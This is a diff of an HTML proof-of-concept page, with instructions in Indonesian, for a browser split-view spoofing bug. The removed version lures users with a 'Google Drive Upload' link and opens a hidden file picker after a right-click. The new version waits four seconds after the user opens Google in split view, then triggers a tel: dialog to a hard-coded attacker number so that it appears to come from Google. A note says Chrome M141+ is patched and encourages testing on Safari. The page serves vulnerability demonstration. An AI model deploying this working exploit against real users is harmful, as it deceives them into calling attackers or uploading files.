@@ -1,68 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Google Drive Upload</title>
+<title>Tel: Spoof via Split View</title>
 <style>
-    h1 {
-        margin: 1em;
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin-top: 50px;
     }
-
     a {
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 80;
+        font-size: 20px;
+        display: inline-block;
+        padding: 10px;
+        background: #eee;
+        border-radius: 8px;
+        text-decoration: none;
+        color: black;
     }
-
-    input {
-        display: none;
-    }
-
     img {
-        width: 100%;
+        margin-top: 20px;
+        max-width: 300px;
+    }
+    .note {
+        margin-top: 40px;
+        color: gray;
+        font-size: 14px;
     }
 </style>
 </head>
 <body>
-<center>
-<br>
-<br>
-<br>
-<br>
 
-<a id="link" href="https://workspace.google.com/intl/en_in/products/drive/" > Right Click and Open in Split To Open Google Drive & Upload Fast</a>
-<br>
-<img id="img">
+<h2>🔥 Tel: Spoofing via Split View (POC)</h2>
+<p>Klik kanan pada tautan di bawah, lalu pilih <strong>"Open link in split view"</strong> (Chrome Canary dengan flag <code>#side-by-side</code> diaktifkan).</p>
 
-</center>
+<a id="link" href="https://www.google.com" target="_blank">📞 Klik Kanan → Open link in split view (buka Google di split)</a>
 
-<input id="fileSelect" type="file" accept="image/*" />
-
-
+<br><br>
+<p><em>Setelah split view terbuka, tunggu 4 detik... akan muncul dialog tel: dari halaman ini (attacker) di atas halaman Google.</em></p>
 
 <script>
-  document.getElementById('link').addEventListener('contextmenu', function(event) {
-    // Prevent the default browser context menu from appearing
+    // Attacker's phone number (bisa diubah)
+    const maliciousNumber = "+628123456789";
 
-setTimeout(function() {
-
-         fileSelect.click();
-
-
-fileSelect.onchange = (event) => {
-        img.src = URL.createObjectURL(fileSelect.files[0]);
-    }
-
-}, 4000);
-
-
-
-   
-  });
+    document.getElementById('link').addEventListener('contextmenu', function(event) {
+        // Biarkan default context menu tetap muncul agar user bisa pilih "Open link in split view"
+        // Tapi kita tetap trigger tel: setelah delay
+        setTimeout(function() {
+            // Memicu prompt telepon menggunakan tel: scheme
+            // Cara 1: window.location.href (akan memunculkan dialog konfirmasi)
+            window.location.href = "tel:" + maliciousNumber;
+            
+            // Cara alternatif: membuat link dan click (sama saja)
+            // const telLink = document.createElement('a');
+            // telLink.href = "tel:" + maliciousNumber;
+            // telLink.click();
+        }, 4000); // delay 4 detik, cukup waktu untuk split view terbuka dan fokus pindah
+    });
 </script>
+
+<div class="note">
+    <strong>📌 Catatan:</strong> Kerentanan ini sudah diperbaiki di Chrome M141+ dengan menyembunyikan permission prompt dari tab tidak aktif. <br>
+    Tapi di Safari 18.4 mungkin masih rentan. Uji coba pada Safari dengan langkah serupa (buka link di split view / tab baru lalu trigger tel: dari tab awal).
+</div>
 
 </body>
 </html>
-
-
-</style>
